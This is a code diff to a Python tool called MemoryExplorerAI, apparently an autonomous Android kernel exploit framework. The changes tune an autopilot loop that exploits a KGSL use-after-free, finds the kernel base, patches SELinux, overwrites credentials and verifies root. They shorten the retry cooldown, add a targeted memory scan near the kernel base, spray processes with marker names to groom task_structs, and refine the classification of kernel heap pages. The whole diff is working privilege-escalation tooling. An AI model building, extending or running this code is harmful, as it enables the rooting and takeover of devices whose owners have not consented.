@@ -784,7 +784,9 @@ class MemoryExplorerAI:
                          "System App": C.BLU, "Kernel Code": C.MAG,
                          "SELinux": C.RED, "SELinux (PATCHED)": C.GRN,
                          "Privilege Struct (ROOTED)": C.GRN,
-                         "Kernel Global": C.CYN}.get(item['type'], C.GRY)
+                         "Kernel Global": C.CYN, "Kernel Heap": C.CYN,
+                         "Task Struct": C.YEL, "Kernel Strings": C.BLU,
+                         "Unknown Object": C.GRY}.get(item['type'], C.GRY)
                 out.append(f" {C.GRY}└──{C.RST} {C.BOLD}{color}[{idx:02d}]{C.RST} "
                            f"{color}{item['type']:<24}{C.RST} │ "
                            f"{C.WHT}{item['description'][:48]:<48}{C.RST} │ "
@@ -1455,10 +1457,21 @@ class MemoryExplorerAI:
     def _autopilot_worker(self):
         """Fully autonomous exploit + learn + verify loop.
         Cycles:  UAF → kbase → selinux → cred → patch → verify → repeat.
-        Runs forever until user pauses (P) or stops (X) or engine dies."""
+        Runs forever until user pauses (P) or stops (X) or engine dies.
+
+        Verticalized: each cycle also kicks the parallel learning
+        workers (already running). When the learning workers discover
+        kbase / selinux / cred we use those addresses; otherwise the
+        cycle's own _run_exploit_pipeline tries to find them.
+
+        Cooldown is 2s (was 5s) so that we re-exploit + re-scan
+        aggressively — KGSL UAF pages get recycled quickly and we
+        want fresh task_structs each time."""
         cycle = 0
-        # Cooldown between cycles (seconds) — short so we retry fast on failure
-        cooldown = 5
+        # Short cooldown — the engine and learning workers are
+        # already doing their thing in parallel, so each cycle
+        # should be quick.
+        cooldown = 2
         self.live["status"] = "AUTOPILOT"
         while self.autopilot_mode and not self.cancel_flag.is_set():
             # Respect pause
@@ -1480,7 +1493,7 @@ class MemoryExplorerAI:
                 # runs in parallel with the exploit pipeline.
                 if not (self.bg_thread and self.bg_thread.is_alive()):
                     self.cmd_learning_start()
-                # Run the full exploit pipeline
+                # Run the full exploit pipeline (E — kbase → selinux → cred → patch)
                 self._run_exploit_pipeline()
             except Exception as e:
                 self.live["last_msg"] = f"AUTO error: {e}"
@@ -1491,6 +1504,14 @@ class MemoryExplorerAI:
                 self._autopilot_walk_creds()
             except Exception as e:
                 self.live["last_msg"] = f"AUTO walk error: {e}"
+            # Also do a targeted scan around kbase to find more
+            # SELinux / init_cred / task_struct hits. The learning
+            # workers do broad scans; this one is narrow + quick.
+            try:
+                if self.kernel_base:
+                    self._autopilot_scan_around_kbase()
+            except Exception as e:
+                self.live["last_msg"] = f"AUTO scan error: {e}"
             # Verify root (uid=0)
             try:
                 self._autopilot_verify_root()
@@ -1542,6 +1563,80 @@ class MemoryExplorerAI:
                             confidence=100,
                         )
                         return
+
+    def _autopilot_scan_around_kbase(self):
+        """Once kbase is known, scan the region around it looking for
+        SELinux / init_cred / task_struct hits. Uses the engine's "S"
+        command, but with a smaller sub-range so each cycle completes
+        quickly. Only fires if kbase is set."""
+        if not self.kernel_base:
+            return
+        if self.op_busy.get("scan", False):
+            return  # don't queue if a scan is already running
+        if not self.ensure_engine():
+            return
+        # 8 MB window around kbase — covers the SELinux / init_cred area
+        # in a typical Android 5.4 kernel.
+        s_start = (self.kernel_base + 0x1000000) & ~0xFFFFF
+        s_end   = s_start + 0x800000
+        if not self._engine_write(
+                f"scan {hex(s_start)} {hex(s_end)}\n".encode()):
+            return
+        with self.bg_lock:
+            self.live["scan_total"]  = s_end - s_start
+            self.live["scan_offset"] = s_start
+            self.live["last_msg"] = (
+                f"AUTO: targeted scan around kbase 0x{self.kernel_base:x}…")
+        # Drive the scan with a short timeout. We don't bother to
+        # fully process every line — the learning workers do that in
+        # parallel. We just want to surface high-sig hits.
+        deadline = time.time() + 15.0
+        idle_count = 0
+        while time.time() < deadline and not self.cancel_flag.is_set():
+            line = self._readline_timeout(timeout=0.5)
+            if line is None:
+                break
+            if not line:
+                idle_count += 1
+                if idle_count > 30:
+                    break
+                continue
+            idle_count = 0
+            if "SCAN_DONE" in line:
+                break
+            if "PROGRESS:" in line:
+                try:
+                    self.live["scan_offset"] = int(line.split(":")[1], 16)
+                except Exception:
+                    pass
+                continue
+            if "MATCH:" in line:
+                try:
+                    parts = line.split(":")
+                    va = int(parts[1], 16)
+                    sig = int(parts[2])
+                    off_in_page = int(parts[3]) if len(parts) > 3 else -1
+                except Exception:
+                    continue
+                self.live["scan_offset"] = va
+                data = self._read_data_packet()
+                if not data:
+                    continue
+                already = any(int(it['va'], 16) == va
+                             for it in self.found_items)
+                if already:
+                    continue
+                if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12):
+                    with self.bg_lock:
+                        self.found_items.append(
+                            self.classify_page(data, va, sig, off_in_page))
+                    self.log_event("autopilot_scan_match",
+                                   {"va": va, "sig": sig})
+        with self.bg_lock:
+            self.live["scan_total"] = 0
+            self.live["last_msg"] = (
+                f"AUTO: targeted scan done "
+                f"({len([i for i in self.found_items if 'KGSL' in str(i)])} items)")
 
     def _autopilot_verify_root(self):
         """Run `id` and parse the uid. Update live state.
@@ -2134,12 +2229,21 @@ class MemoryExplorerAI:
                 if idx >= slice_end:
                     break
                 try:
-                    # Marker encodes the subworker id (W0..W2) + 3-digit
-                    # index, so we can tell which subworker sprayed
-                    # which process if we want to debug later. KETW
-                    # prefix is 4 chars + 3 digits = 7 chars, fits in
-                    # the 8-byte spray comm easily.
-                    name = f"KETW{worker_id}{idx % 1000:03d}"
+                    # Marker encodes the subworker id (W0..W2) + 4-digit
+                    # index so we can tell which subworker sprayed which
+                    # process if we want to debug later. KETW + 3 digits
+                    # = 7 chars; fits in 8-byte spray comm. We also
+                    # spray some KETO04NN markers because the C engine's
+                    # sig-1 (task_struct KETO0422 detection) is tuned to
+                    # that family, so the scan picks them up reliably.
+                    # KETW gives us per-worker attribution; KETO gives us
+                    # max scan hit-rate.
+                    spray_idx = idx
+                    # Alternate KETO / KETW so we get both kinds of hits
+                    if spray_idx % 2 == 0:
+                        name = f"KETO{spray_idx % 10000:04d}"
+                    else:
+                        name = f"KETW{worker_id}{spray_idx % 1000:03d}"
                     p = _sp.Popen(
                         ["sh", "-c", f"exec -a {name} sleep 3600"],
                         stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
@@ -2290,10 +2394,28 @@ class MemoryExplorerAI:
                         else:
                             interesting, reason, conf = self._is_page_interesting(data)
                             if interesting:
+                                # Map the reason to a sensible type. We
+                                # only fall back to "Unknown Object" if
+                                # it's something we can't classify.
+                                if "cred-struct" in reason:
+                                    itype = "Kernel Heap"
+                                    desc  = f"cred struct: {reason}"
+                                elif "kptrs=" in reason or "kptr @" in reason:
+                                    itype = "Kernel Heap"
+                                    desc  = reason
+                                elif "comm-like" in reason:
+                                    itype = "Task Struct"
+                                    desc  = reason
+                                elif "strings" in reason:
+                                    itype = "Kernel Strings"
+                                    desc  = reason
+                                else:
+                                    itype = "Unknown Object"
+                                    desc  = f"Auto-found ({reason})"
                                 with self.bg_lock:
                                     self.found_items.append({
-                                        "type": "Unknown Object",
-                                        "description": f"Auto-found ({reason})",
+                                        "type": itype,
+                                        "description": desc,
                                         "va": hex(va),
                                         "confidence": conf,
                                         "data": data,
@@ -2457,16 +2579,19 @@ class MemoryExplorerAI:
         #    page. Real kernel heap pages have many pointers. Real-user
         #    pages (sparse) usually have 0-1.
         kptrs = 0
+        first_kptr_off = -1
         for i in range(0, len(data) - 8, 8):
             v = int.from_bytes(data[i:i+8], "little")
             if 0xffffff8000000000 <= v <= 0xffffffcfffffffff and v != 0:
+                if first_kptr_off < 0:
+                    first_kptr_off = i
                 kptrs += 1
         if kptrs >= 8:
-            return (True, f"kernel-heap (kptrs={kptrs})", 75)
+            return (True, f"kernel-heap (kptrs={kptrs}, nz={nonzero}/{len(data)})", 75)
         if kptrs >= 3:
-            return (True, f"kernel-data (kptrs={kptrs})", 55)
+            return (True, f"kernel-data (kptrs={kptrs}, nz={nonzero}/{len(data)})", 65)
         if kptrs >= 1:
-            return (True, f"has kernel pointer at 0x{i:x}", 70)
+            return (True, f"has kptr @ 0x{first_kptr_off:x} (kptrs={kptrs})", 70)
 
         # C. Real Linux kernel comm strings (swapper/0, kthreadd, init,
         #    kworker/..., xfs-..., jbd2/..., etc.). These are 16 bytes
